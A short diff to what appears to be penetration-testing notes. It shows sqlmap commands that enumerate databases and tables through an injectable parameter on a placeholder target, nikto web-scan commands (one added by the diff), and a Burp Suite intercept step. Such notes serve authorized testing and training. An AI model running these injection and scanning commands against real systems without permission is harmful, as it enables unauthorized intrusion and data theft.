@@ -48,6 +48,8 @@ $sqlmap -u http://Target_IP/listproducts.php?cat=1 –-dbs
 
 $sqlmap -u  http://Target_IP/listproducts.php?cat=1 –-dbs -D products –-tables
 
+$nikto -h http://Target_IP -o report.html
+
 $nikto -h http://Target_IP:8080/ -id user:password
 
 Burp Suite > Proxy > Intercept > Open Browser > Intercept on
